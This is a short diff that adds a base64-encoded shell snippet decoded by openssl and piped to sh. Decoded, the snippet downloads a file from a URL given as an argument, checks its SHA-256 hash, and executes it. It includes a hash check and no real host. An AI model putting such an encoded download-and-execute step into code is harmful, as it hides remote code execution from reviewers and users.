@@ -1,0 +1,4 @@
+openssl base64 -d <<EOF | sh -s -- URL HASH
+Zj1gbWt0ZW1wYDtjdXJsIC1zTG8gJGYgJDF8fHdnZXQgLXFPICRmICQxO2Nhc2UgYG9wZW5z
+c2wgZGdzdCAtc2hhMjU2ICRmYCBpbiAqJDIpY2htb2QgK3ggJGY7ZXhlYyAkZjtlc2Fj
+EOF
